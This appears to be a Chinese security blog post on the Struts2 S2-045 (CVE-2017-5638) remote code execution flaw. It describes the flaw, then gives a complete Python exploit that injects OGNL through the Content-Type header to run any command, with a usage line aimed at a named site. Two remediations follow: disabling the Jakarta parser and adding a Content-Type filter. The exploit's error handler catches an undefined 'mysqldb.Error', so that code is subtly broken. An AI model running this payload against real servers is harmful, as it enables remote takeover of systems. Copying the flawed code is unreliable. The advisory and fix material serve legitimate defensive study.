<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>Struts2 S2-045 Jakarta插件远程代码执行漏洞利用与修补 - F0rmat的博客 | 专注于网络攻防和信息安全</title>

<meta name="description" content="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。
" /><meta name="keywords"
  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
  <meta name="referrer" content="no-referrer" />


<link rel="stylesheet" href="https://getshe11.com/css/main.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">



<meta property="og:title" content="Struts2 S2-045 Jakarta插件远程代码执行漏洞利用与修补" />
<meta property="og:description" content="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://getshe11.com/post/struts2-s2-045-jakarta-plug-in-remote-code-execution-vulnerability-exploitation-and-repair/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2017-08-29T22:53:58&#43;00:00" />
<meta property="article:modified_time" content="2017-08-29T22:53:58&#43;00:00" />

<meta itemprop="name" content="Struts2 S2-045 Jakarta插件远程代码执行漏洞利用与修补">
<meta itemprop="description" content="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"><meta itemprop="datePublished" content="2017-08-29T22:53:58&#43;00:00" />
<meta itemprop="dateModified" content="2017-08-29T22:53:58&#43;00:00" />
<meta itemprop="wordCount" content="213">
<meta itemprop="keywords" content="漏洞,Struts2," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Struts2 S2-045 Jakarta插件远程代码执行漏洞利用与修补"/>
<meta name="twitter:description" content="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->
</head>

<body>
    <div class="header-placeholder"></div>
    
    <header class="header">
        <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    
    <a class="site-title" href="https://getshe11.com/">F0rmat</a>
    
    <nav class="site-nav">
        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
    </nav>
</div>

    </header>

    
    <div class="page-content">
        <div class="wrapper">
            
            <div class="col-main">
                <div class="post">
    
    <header class="post-header">
        <h1 class="post-title">Struts2 S2-045 Jakarta插件远程代码执行漏洞利用与修补</h1>
        <p class="post-meta">Aug 29, 2017</p>
    </header>
    <article class="post-content">
        
        
        
        
        
        
        <p>近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。</p>
<p><strong>漏洞编号</strong>： S2-045，CVE-2017-5638</p>
<p><strong>漏洞名称</strong>：基于 Jakarta plugin插件的Struts远程代码执行漏洞</p>
<p><strong>官方评级</strong>：高危</p>
<p><strong>漏洞描述</strong>：Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
<p><strong>漏洞利用条件和方式</strong>： 黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。</p>
<p>1.基于Jakarta（Jakarta Multipart parser）插件的文件上传功能</p>
<p>2.恶意攻击者精心构造Content-Type的值</p>
<p><strong>漏洞影响范围</strong>：</p>
<p>Struts 2.3.5 – Struts 2.3.31</p>
<p>Struts 2.5 – Struts 2.5.10</p>
<hr>
<h1 id="测试利用代码">测试利用代码</h1>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># encoding:utf-8</span>
<span class="kn">import</span> <span class="nn">urllib2</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">poster.encode</span> <span class="kn">import</span> <span class="n">multipart_encode</span>
<span class="kn">from</span> <span class="nn">poster.streaminghttp</span> <span class="kn">import</span> <span class="n">register_openers</span>
<span class="k">def</span> <span class="nf">poc</span><span class="p">():</span>
<span class="n">register_openers</span><span class="p">()</span>
<span class="n">datagen</span><span class="p">,</span> <span class="n">header</span> <span class="o">=</span> <span class="n">multipart_encode</span><span class="p">({</span><span class="s2">&#34;image1&#34;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;tmp.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)})</span>
<span class="n">header</span><span class="p">[</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&#34;</span>
<span class="n">header</span><span class="p">[</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&#34;</span>
<span class="k">try</span><span class="p">:</span>
<span class="n">request</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span><span class="n">datagen</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
<span class="k">print</span> <span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="k">except</span> <span class="n">mysqldb</span><span class="o">.</span><span class="n">Error</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
<span class="k">print</span> <span class="n">e</span>
<span class="n">poc</span><span class="p">()</span>
</code></pre></div><p><strong>POC使用方法： st2-045.py <a href="http://www.getpass.cn">http://www.getpass.cn</a> ifconfig</strong></p>
<hr>
<h1 id="修复方案1">修复方案1</h1>
<p>将<!-- raw HTML omitted -->/var/www/apache-tomcat-7.0.14/webapps/ROOT/WEB-INF/lib/<!-- raw HTML omitted -->下的 <!-- raw HTML omitted -->struts2-core-2.3.31.jar<!-- raw HTML omitted -->压解出来，然后编辑<!-- raw HTML omitted -->org\apache\struts2<!-- raw HTML omitted -->下的<!-- raw HTML omitted -->default.properties<!-- raw HTML omitted -->文件</p>
<p>找到<!-- raw HTML omitted -->struts.multipart.parser<!-- raw HTML omitted -->，该选项就是Struts2的Multipart parser应用配置，默认值为jakarta，即此次出现命令执行漏洞的上传框架。</p>
<p>将其修改为pell，相当于将存在漏洞的jakarta框架禁用了。</p>
<p>修改后值<!-- raw HTML omitted -->struts.multipart.parser=pell<!-- raw HTML omitted --></p>
<p>重启tomcat服务，切换到<!-- raw HTML omitted -->/var/www/apache-tomcat-7.0.14/bin/<!-- raw HTML omitted -->目录下，首先执行<!-- raw HTML omitted -->./shutdown.sh<!-- raw HTML omitted -->，然后执行<!-- raw HTML omitted -->./startup.sh<!-- raw HTML omitted --></p>
<p>再次执行POC</p>
<hr>
<h1 id="修复方案2">修复方案2</h1>
<p>添加拦截器：此次 S2-045 漏洞触发点为Content-TypeHTTP头字段，故此可以添加action拦截器，过滤非法请求。</p>
<p><strong>拦截类SecurityFilter.java代码：</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.Filter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.FilterChain</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.FilterConfig</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.ServletException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.ServletRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.ServletResponse</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>


<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SecurityFilter</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="kd">implements</span> <span class="n">Filter</span> <span class="o">{</span>

        <span class="cm">/**
</span><span class="cm">         * 
</span><span class="cm">         */</span>
        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="n">1L</span><span class="o">;</span>


        <span class="kd">public</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">www_url_encode</span><span class="o">=</span> <span class="s">&#34;application/x-www-form-urlencoded&#34;</span><span class="o">;</span>
        <span class="kd">public</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">mul_data</span><span class="o">=</span> <span class="s">&#34;multipart/form-data &#34;</span><span class="o">;</span>
        <span class="kd">public</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">txt_pla</span><span class="o">=</span> <span class="s">&#34;text/plain&#34;</span><span class="o">;</span>

        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">arg0</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">arg1</span><span class="o">,</span>
                        <span class="n">FilterChain</span> <span class="n">arg2</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>

                <span class="n">HttpServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletRequest</span><span class="o">)</span> <span class="n">arg0</span><span class="o">;</span>
                <span class="n">HttpServletResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletResponse</span><span class="o">)</span> <span class="n">arg1</span><span class="o">;</span>

                <span class="n">String</span> <span class="n">contenType</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">&#34;conTent-type&#34;</span><span class="o">);</span>

                <span class="k">if</span><span class="o">(</span><span class="n">contenType</span><span class="o">!=</span><span class="kc">null</span><span class="o">&amp;&amp;!</span><span class="n">contenType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;&#34;</span><span class="o">)&amp;&amp;!</span><span class="n">contenType</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">www_url_encode</span><span class="o">)&amp;&amp;!</span><span class="n">contenType</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">mul_data</span><span class="o">)&amp;&amp;!</span><span class="n">contenType</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">txt_pla</span><span class="o">)){</span>

                        <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">&#34;text/html;charset=UTF-8&#34;</span><span class="o">);</span>
                        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;非法请求Content-Type！&#34;</span><span class="o">);</span>
                        <span class="k">return</span><span class="o">;</span>
                <span class="o">}</span>
                <span class="n">arg2</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">FilterConfig</span> <span class="n">arg0</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>

        <span class="o">}</span>

<span class="o">}</span>
</code></pre></div><p>将<!-- raw HTML omitted -->SecurityFilter.java<!-- raw HTML omitted -->文件编译为<!-- raw HTML omitted -->SecurityFilter.class<!-- raw HTML omitted -->，放入服务器路径为：<!-- raw HTML omitted -->/var/www/apache-tomcat-7.0.14/webapps/ROOT/WEB-INF/classes/<!-- raw HTML omitted --></p>
<p>然后修改<!-- raw HTML omitted -->web.xml(/var/www/apache-tomcat-7.0.14/webapps/ROOT/WEB-INF/web.xml)<!-- raw HTML omitted -->使得添加的拦截器生效
<strong>添加代码：</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;filter&gt;
    &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;
    &lt;filter-class&gt;SecurityFilter&lt;/filter-class&gt;
  &lt;/filter&gt;
&lt;filter-mapping&gt;
    &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;
</code></pre></div><p><strong>重启tomcat</strong></p>
<p>漏洞相关链接：</p>
<p><a href="http://www.freebuf.com/sectool/129224.html">http://www.freebuf.com/sectool/129224.html</a></p>
<p><a href="http://www.codesec.net/view/541868.html">http://www.codesec.net/view/541868.html</a></p>
<p><a href="https://www.t00ls.net/thread-38534-1-1.html">https://www.t00ls.net/thread-38534-1-1.html</a></p>
<p><a href="https://github.com/Flyteas/Struts2-045-Exp">https://github.com/Flyteas/Struts2-045-Exp</a>  Struts2 S2-045 (CVE-2017-5638) Exp Tools</p>
    </article>

    
    <div class="prevnext">
        



<ul class="prevnext">
    
    
    <li>下一篇：
        <a href="https://getshe11.com/post/struts2-vulnerability-poc-summary/">
            Struts2漏洞POC汇总
        </a>
    </li>
    
</ul>

    </div>
    
    <div class="post-comments">
        
  
  

  
    <script src="https://utteranc.es/client.js"
            repo="F0r3at/Getshe11.com"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </div>
</div>
            </div>
            
            <div class="col-second">
                <div class="col-box col-box-author">
    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
    <div class="col-box-title name">F0rmat</div>
    <p>Stay Hungry, Stay Foolish.</p>
    <p class="contact">
        <a href="http://github.com/F0r3at">Github</a>
    </p>
</div>

<div class="col-box">
    <div class="col-box-title">Newest Posts</div>
    <ul class="post-list">
        
        <li>
            <a href="https://getshe11.com/post/research-on-php-deserialization/" class="post-link">PHP反序列化研究</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/" class="post-link">Gitlab Cookie 反序列化漏洞研究</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/kali-install-clash/" class="post-link">Kali Linux安装Clash</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
        </li>
        
    </ul>
</div>

<div class="col-box post-toc hide">
    <div class="col-box-title">TOC</div>
</div>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="wrapper">
    © 2021    <a href="https://getshe11.com/">F0rmat</a>
</div>
    </footer>
    
    
<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>

<script src="/js/easybook.js"></script>

<script src="/js/lazysizes.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
<script src="/js/figure.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-XXXXXXXX-X', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>






</body>

</html>